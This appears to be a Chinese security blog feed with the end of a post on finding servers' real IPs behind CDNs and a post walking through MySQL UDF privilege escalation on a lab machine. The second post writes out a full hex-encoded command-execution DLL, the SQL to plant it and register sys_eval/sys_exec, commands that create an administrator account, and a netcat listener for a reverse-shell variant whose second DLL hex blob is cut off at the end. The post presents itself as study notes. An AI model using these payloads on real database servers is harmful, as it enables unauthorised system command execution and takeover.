查找真实IP如果目标服务器不存在CDN，可以直接通过www.ip138.com获取目标的一些IP及域名信息。如果目标服务器存在CDN，如何让CDN找到目标服务器的真实IP呢？？？ 目标服务器存在CDN什么是CDN呢？ CDN就是内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。 所以如果目标服务器使用了CDN，可以直接ping目标的域名，但得到的并不是真正的目标服务器，只是离我们最近的一台目标节点的CDN服务器，这就导致了我们无法直接得到目标的真实IP。 判断目标是否使用了CDN通常会通过ping目标主域，观察域名的解析情况，以此来判断其是否使用了CDN。 还可以利用在线网站17CE(https://www.17ce.com)进行全国多地区的ping服务器，然后对比每个地区ping出的IP结果，查看这些IP是否一致，如果一样，极有可能不存在CDN；如果IP大多不太一样活规律性很强，可以尝试查询这些ip的归属地，判断是否存在CDN。 绕过CDN寻找真实IP 内部邮箱源 扫描网站测试文件 分站域名 国外访问 查询域名解析记录 如果目标网站有自己的APP，尝试抓取APP的请求 绕过CloudFlare CDN查找真实IP 验证获取的IP找到真实IP以后，如何验证其真实性呢？ 如果是web，直接用IP访问，看看相应页面是不是和访问域名返回的一样；或者在目标段较大的情况下，借助类似Masscan的工具批量扫描对于IP中所有开了80、443、8080端口的IP，逐个尝试IP访问。 收集敏感目录文件探测web目录结构和隐藏的敏感文件，从中获取网站的后台管理页面、文件上传页面，甚至网站的源代码。 扫描工具主要有：DirBuster、御剑、wwwcan、dirmap等。]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL提权的几种姿势]]></title>
    <url>%2F2019%2F07%2F18%2Fmysql-ti-quan-de-ji-chong-zi-shi%2F</url>
    <content type="text"><![CDATA[前言最近在学习提权，什么都不懂，只能跟着学长们走一遍吧！！！ MOF提权待补充。。。。。。。。。。 UDF提权环境本机os： win10 靶机os： win7 php： 5.4.45 mysql： 5.5.53 udf是什么udf：”user defined function”，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，性质就象使用本地MySQL函数如abs()或concat()。udf在mysql5.1以后的版本中，存在于”mysql/lib/plugin”目录下，文件后缀为”.dll”，常用c语言编写。 如何使用udf假设我的udf文件名为‘udf.dll’，存放在Mysql根目录(通过select @@basedir可知)的‘lib/plugin’目录下。在udf中，我定义了名为sys_eval的mysql函数，可以执行系统任意命令。如果我现在就打开mysql命令行，使用select sys_eval(‘dir’);的话，系统会返回sys_eval()函数未定义。因为我们仅仅是把‘udf.dll’放到了某个文件夹里，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。 所以，我们应该把‘udf.dll’中的自定义函数引入进来。 实例用法： CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.dll&#39;; 只有两个变量，一个是function_name(函数名)，这里用的是sys_eval；还有一个变量是shared_library_name(共享包名称)，即udf.dll。 这个函数用于执行系统命令，用法如下： select sys_eval(&#39;cmd command&#39;); 利用前提 掌握MySQL数据库的账户，拥有对MySQL的insert和delete权限，用来创建和抛弃函数 拥有可以将udf.dll写入相应目录的权限 思路过程整理一下思路： 将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录的lib\plugin文件夹下） 从udf文件中引入自定义函数(user defined function) 执行自定义函数 MySQL信息版本 mysql&gt; select version(); +-----------+ | version() | +-----------+ | 5.5.53 | +-----------+ 1 row in set (0.00 sec) secure-file-priv mysql&gt; show variables like &#39;%secure%&#39;; +------------------+-------+ | Variable_name | Value | +------------------+-------+ | secure_auth | OFF | | secure_file_priv | | +------------------+-------+ 2 rows in set (0.09 sec) 这个参数限制了MySQL的导出。 该参数为NULL时不允许导出、为空时允许在任意文件夹中导出、为路径时允许在该路径中导出。 使用load_file、dumpfile等函数时需要在my.ini中将secure-file-priv设为空，不是NULL。若文件中没有这个参数可以添加secure-file-priv=&#39;&#39;。 上传udf文件下载地址：https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql mysql&gt; select @@version_compile_os, @@version_compile_machine; +----------------------+---------------------------+ | @@version_compile_os | @@version_compile_machine | +----------------------+---------------------------+ | Win32 | AMD64 | +----------------------+---------------------------+ 1 row in set (0.00 sec) 根据mysql的位数，我们这里选择的是32位的 将整个DLL文件以十六进制编码后写入磁盘。（注意windows环境下目录路径需要转义） mysql&gt; select @@plugin_dir; +------------------------------------+ | @@plugin_dir | +------------------------------------+ | C:\phpStudy\PHPTutorial\MySQL\lib\plugin\ | +------------------------------------+ 1 row in set (0.01 sec) mysql5.1以上的版本是默认没有plugin目录的，网上有说可以使用ntfs数据流创建： select &quot;test&quot; into dumpfile &#39;C:\\PHPStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#39;;但是我在本地测试一直没成功，也不知道怎么回事 ps：自己手工创建了一个plugin。。。。。。。。。 我们将udf写到上述目录 select 0x十六进制内容 into dumpfile &quot;C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;; 将udf文件转化为十六进制 select hex(load_file(&#39;lib_mysqludf_sys_32.dll文件路径&#39;)) into dumpfile &#39;xx.txt文件路径&#39;; 成功写入 mysql&gt; select 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000ce393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffffc80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 into dumpfile &quot;C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;; Query OK, 1 row affected (0.00 sec) load_file如果目标服务器已上传了我们的udf.dll，使用load_file写入到lib/plugin select load_file(&#39;C:\\phpStudy\\PHPTutorial\\MySQL\\udf.dll&#39;) into dumpfile &quot;C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&quot;; 到这儿如果没有报错的话就说明已经在目标主机上成功生成了udf文件。下面要导入udf函数： CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.dll&#39;; //导入udf函数 导入成功的话就可以使用了： SELECT sys_eval(&#39;ipconfig&#39;); //返回网卡信息 udf函数利用介绍一种最常用的函数sys_exec create function sys_exec returns string soname &#39;udf.dll&#39;;#导入该函数 select sys_exec(&#39;net user test 123456 /add&#39;);#创建test用户 select sys_exec(&#39;net localgroup administrators xutest /add&#39;); #提升到超级用户组 drop function sys_exec;#删除该函数 反弹端口提权实质是udf提权 先在另一台服务器上开启端口监听 lv@ubuntu:~$ nc -vv -l -p 12345 Listening on [0.0.0.0] (family 0, port 12345) 上传udf.dll use mysql; set @a=concat(&#39;&#39;, 0x4d5a4b45524e454c33322e444c4c00004c6f61644c696272617279410000000047657450726f63416464726573730000557061636b42794477696e6740000000504500004c010200000000000000000000000000e0000e210b0100360090000000100100000000003d9502000010000000a00000000000100010000000020000040000000000000004000000000000000010030000020000000000000200000000001000001000000000100000100000000000001000000009980200dd020000f19702001400000000c001009000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e557061636b000000b00100001000000000000000000000000000000000000000000000600000e02e727372630000000050010000c00100e6da000000020000000000000000000000000000600000e088010010e89a02101b0000000e000000001000106b970210b7970210ba970210c8970210a3970210fc0f0010de960210e0960210809502101dba0110ed970210ffaf0110d2960210000400007c070000c40b0000b30200006604000090c0011000000000ffffffff01000000010000000100000001000000000000000000000000000000010000008800008018000080000000000000000000000000000002006500000038000080660000006000008000000000000000000000000000000100040800005000000090000100004400000000000000000000000000000000000000000000000001000408000078000000904401005c3c000000000000000000000300420049004e00459398edb4853493541907b2de1fcbd640cd0773df2017d5f39748433f6d90c556f2b1c13f1be3bcb417f756a33186e453b17faf31e8157911b03da9aaf41f2277afffec07571bfae8214b0ff18af2f7c0ad2d95a1ff0f487658e587923bc1ce9d2c2698c74b940c5842bf55c7da2026563c174c45c6c5e08e95b030390ef0886bd124043aed5b1631b138955065fa05fbfcc1c0b81636c51c7f18bccc846ac8305f5c5134fd92a3e9cb2bb5d99ee1e21a6f5d2929597c59b61e8925c1675138746f1f549d1b8a0c35b7dab30b46a401737162d316fb50723e8a98ca5d6d298259015fe6e1c0a402790e15a965807b488c73e6915ffd6e57d333c0d86ef3a562e0bf0bccbe4bc7ccb560bc2df75d593904f638eae6a964c33f4e123a1d3c213b184373bf34c66ed68b368316156e32f6fa63e02add3b03893f73af8abd1099c48c1d0c886314167008ef255d5c2c3539fb781d6d39aa432d654c702f15df0a339530889adfefde4b9df29d2e8fa7e4317fda1b0588a22265eb53c317bc6ea94fa1981968d5a60921ff60f9e9559123aeaa8d1e91e38fb1a2fb1d2075454e8ef226538ed8307db2c99cd396b5c6da829569c3875f317a4bff429b0528d204af4284fc05207901d48e52b386e5d44c69a2e8e3086f137f1d0694ecd619ecc97af83a97d5a0598701b386bd704864c72b3858824fc94082da933d5fadb23ef3dee6528cd4cb2eefe2f2b03d17857940d70222d541b2523f4e7d5b8ee46caba89830d664defb08f798e83818cde2701b8c5d37fc6c5c045ae468efca8b8d5b62b60811c21dae6b86deffa3824e7581435c0bc67555c2d498047554b52d0bfc909911e94ce5d6d3a72659b0ee25f2b40be7d239115256d8c2687afc7e075a2557f974d9130d76e09955235ed4afbc03891d8cc489c8a6f0aa00cfa41ceffd29df70edd17679477c4edd29023c807a55e8dfe614fefe44ad759cfca628d9da21b68e2d6a7ab33d62b175fb858c94158923278f256e96eff885e3eafa12b09ecabfa54d523a3c33270510fd821a0f56e24d3bfaa815a6bd4e2eba52e52a940037728e2cbcd8278fe714384a4bfc887797b071bb440b010a9d0db60cbacee05907b7b08e20dba7f45ffd21265bc47086f8275c1c5071afaeb7ce0336e0a5facf0a7923597c7f4ee7b54512b38608c8ce06acd05cfcdd68ec58f288889ef615623409bc88dd3b09b8be22fcc199755426b4b0704ec21ae1a3e7efe21cf6952456f3743d8d76e1d02e7f7815ea30feb20f279fa9cf827d7618c1c182be35a5ab2eb9f611057b493eff526a75513347a1dce859f1d8d5cc9e842f55f82211b2fa26ce53c5f133afd31531c50324a5429b74fab0746eed031acb0d02344e1b495bca244ae6eba4dcd3da28419a064c22e895880fd2485c3e6861b6e06a4e43959b9d0633774ea85692b12408f6867903f8b9bf790973680440d4822238690617af451d0eebf942d4c98637e9ba092b38dcdc608f330722cc255a4feb5d2a3cb268518ebf43231d9630ac95ae22ff0b8640335febcaf6a3066be83f03673636639e7cb025963d4071886ef072bf9f6f5ad0e0a407734b77320cb1fc6a6a07d14d36403ac1b849eba998b5f64d59ecfa4e30200d84d236a12b1b11acae3e4d74ca5368657f93b4d80cc5356c5537ffab7d3f792a03912a01d94c03f4f097824586708ecc7cbd1db4b7e24a0f2e45121629b9c2bc92716b790246c4a4159fd9e4958fc13a4a72c1d799078d601f3eba6457ae19a68877841d343175f3b692ec219c3a059931421596335af3121670ef9602fce94de822922d7f1c357f7719b2a63de4a0c9b648297326b5a32082462e6bd83457f5c415a418209b4deecbb66f26383d9244f08e0aee60659808dbd2a4744865f6b6a0950ed88138a0c6496245c84d60caabef5facc467f114dd3b695e39fb076887147be54b8ff924aad0e159f4da839d7b67ea764b3e5906ad36bc3c476584bb38b7f009cedab0e6d89bb9ec76e3228e559b69c763bcbe2804dfbc4c6eba24173214dd72f455eaf170e5afc8b7a1ffac801dcd05a53aaef649f67f1d11cf249cdcf2e33a7d93e872d323a836a78be609996b592f3bb5fd8f6b952fd09d66647dcc055aa681b8af88597d510daae5255d2318b9b5e116b83b06c8a644010d677c683684abd9b677ac444ec7163218e4708336b0d12bbb660fe9bc21e49d2efc76d74e26c71d6c945267fd7d664fe5385abc834f661fe715b0924e9c63f5f6c88cb0ee11b44393a9113f6c17d56bd982a00cd4811653669c3a1b9535260742017659cf380fbf76ae37b92863bc94923f3990658db72c9c64bc29d4c2c03ec0c1c74e3558f66092c1d78d710d52a2c96cc6cad8729d9385016b36c9d231986cb60e8cfeb37aacf1205b9cbad985834c8b4b9d435e17dbc94967b5eb3e32e2a0423744951b1a087d85a822663de7a3f9c2253f7366d02e161b9b3a18fdee2946d741d3f2a5b0d0f3217e54d9cc97c8a62abca1b114240cce3576a7131069751af5a280721df185caace01a618f57cd8dc52e03a85048adb2d6f31d9d136817602ee2c38f694e6cb9eb2e830abf46b8a2f4ecf4fbd190e357d774e1dbe9de09650ea97486d41bb406c36d07dfa66c8347720158494c21ef841d6219aa0d3c8dd1cd33c3734e49ee574928bb0b1b28f86f0eced7c8fc50e93868455d6419ed7bffe464315490de54ab89437cd6f9f2e71fd59e4c5863ec3f83e4760edc9bc51a9c55a4b253c7966eb110259221449c131b3b328630ea1da1d8553d05fe6830902950a48d623396edd5280a1bbb165d1eab1a77f157d1b7870c4411850752bab0b6fb688d268901c2d8e456e3ee0614d1dd30a138f33661268fd83eb720f5953c280949f7760372ddfbcfd9fa54ced88fe574da013246aeea3bd41b72c6dbf603adcc21e5b7de44345d2a972ec002761a886b55579b8ff13286f668504c3290d15dbef81b1e96ad946a6466b7128d0ac11fb7fad4fe60b6c70e687c5665827a1ded9326f329c3dacb0dbd25ac1adcdc3eccab7d97db8c55b96afd5504bde724ca1489ef6108b25da9555f78111a6a04c30ae62961ade9cb8c02be27ba9984c0104ab80376719a08047d821b0bf60e1a29a6d7d377760b053ae91bf8057156e5b593a7dc8058f05e2da4ca217cf5be8881e00fa9d1f7a618820a0f0b2ba6175dbca0b6f035bc24ebe83198b5a90ebde91e8954581da67159639f40f37210a1bd8bf14dc987fd37b1a5fe69bda234e6d7f70d9ca0531039f19fd054904eea5b7a52ec468e5345437d0737b1495dc7249ea4cfa6f48c2e3e6158d5f0f1efd1bafb4d7fe0b0dce7ad98e8d3f57bb708a8aea83a0eea3ddc00394dfcdfafd308b6b24fa20c7625d2fcd6a5fae7d273ec98eea794bfe979dc3123ffc32c197bdca6321b57785908e6d19ab6f536a8df7e1e05baded7a4ebc007766c508a13394f51803beea47fac0ed97c25ed9888ddc6dc6219e704c6a132cd04cff7447b2df742108d0272366b11b2c4767464b460251de4ce3ce6d193589d14aec9b97766a6883e4dbf1dca0edf32f8980ebf2f9c935dcc56fa6e0b29798ea458e6edc0af271e6814fa425548e41fc8f641b8ad487a20812e4eb25063746b3d4244b101031580a0119d649ca5f32a68b11e7d5741a5ad7682fa8fafbe5aff113269b9a47923f81d3a028615f8c6e7b38e78e443cb2a49d91c2a7757a99df35aaa71dfd21e0b5591af970e6d2f239ff7e2d76acd9967ad6fc30d460d552f1930461e9b86a92d358618fa3b539029603a3260fc65d57a5909e35777a633d9093911fc636bfe3745a7510cb4633092223f5315f6745a604ac0365abae8968b19677f840b1502e21b638ceffd5075b3d3688eab91379dfeed65beaa5f7ca5b971dbc53c6c000b259dea5d6fd84b2e12090331a45299d807d3c12545f84710d36168ca4f277c8fa3982806faef71d73860b58f8db7a3116af13418100c8e905651b538b5c1853fb194c574a918b8f0426152253ff3db5af8289080fe0d7bf2b9d907c54eb2604d8f4e3865d8c7e8659acd1928182206c0efad42664b6ef473f74d7a8d681273590a487f250c143bd18253c3df904b620f4203757b029d8b41bfbcb9ace3d5e7673386dab5e3e486a3f49bbf89f5a4c67e0c1067c0adf6bbdfa43cd6289c1e45e46fc4f236a708684f9461787a90f6fd9a1f55690bbb3ddfcb94d960c39f58110acd1a4538b6ae85b06e4024610575bc3069a2b90b07e01096854e1e8bd00260bd495f975c8543030031c6fbcd201bf384f27f72af8c9ce354ef66a27fbc04dc0bb34f7a67518575d78bcac95243f1743b0f843f7806d1b6278766e05e90694a328230b378516ece63e46180a0c2d3972674fa8de29c864198e66173bea93f54995bfaa4b1e8638ba111187e26161d23ddbaff9a1dde6c8601b6c1c5e0658a153685de38e7a92a39d34587d67d10da2d7a01e70ac5488b16d0002229154101f0d5f6afd6636f7e376a3d5842861f8c5642b81676a5a3dc14de9bfe1e3011cb9e4cdd6a1afa87e84f86ee792a090f48f9540a23eb0928cf8d9f52a44acba76c827494bb6ef8971f1690d441f0ba8322b5cb15ee105e95ab47f560ecef4d5046c75ded3523549b3a2a0c878906af9ef17bddb57d82a437932d9b6802cf178e34f9c4764054f01902258e7d2317b9a98e78bc273e406d6fd2d33c4270cfd4596fedec01c4f9e6216f73a71e930b208d247dceee69f0d1f55a179c70b69f71c0e8a8b4cfdd89cdb1908d6d96b33d98a26456f79f26c744f9f7508983324cc354c1f20f89480c8c506fa04f59cb8ae99f8bf4ae9ba8b06f6aa052b695aa5da8143eefda5b3a4d65b0333f944861d2d53503236151731f4b262d66597865ffebc3474f3566b56f4ba520e9fd933c304ef9ca43bd6336e9b82e0e76724c1820aa1bc231ae694cf759938c29c210cb676885a65b4ae212f4382788458ea9a136bfc9bfed6f159e0844c4db54a3bac68d95cc91623f7e1476f8f736c131097daf671157f18d67116a2d273fa9e53375955bb7bb6ecb3518e7f05dd9248a1e26607708ab2a67904c44325fbe219e04512da82e93d466fa33a7d00d70d1cd45d650f3bf001bd7a2d0ae1c545fb75fb6af69bbde85e358e272b26dd2ea189db0a41c1131ec3882d5b72e3a643e02527909758ba4bd542746b60d822b35884b828a12b683aa4abd4861f7a249bbc0dbc12559e88c2bce5bf5aa35c0b17c69794abbc5765e7eabca36ebfb7318998f974d42f3df2564e29abe38e7671d25702051346b86fa36f6b71dae27e7506e5a5a790658646ab672bb825857890107e837992ab33ad751963c155d5d85dbca61092accb9e38c4589db3487082068f2dfc818fe05f8ce8a18dfc6716e0466e87d79ad6bf1353b0a34be96416d0f44c44a9563fdbc2c093875a385ecfdc6e11a488964690333669e8dc714957e0e1b3ce29c2309bd17ccc74520cda658381385821f44137a3486a682fcefc2e111d8304264538a64e8acb6e791960342463f970c4d250e154f28b66a5a7011bf7942c04e053804c100e79a1cbc4278f689ab9a3bd4669928bcad4c165644b53695fc7910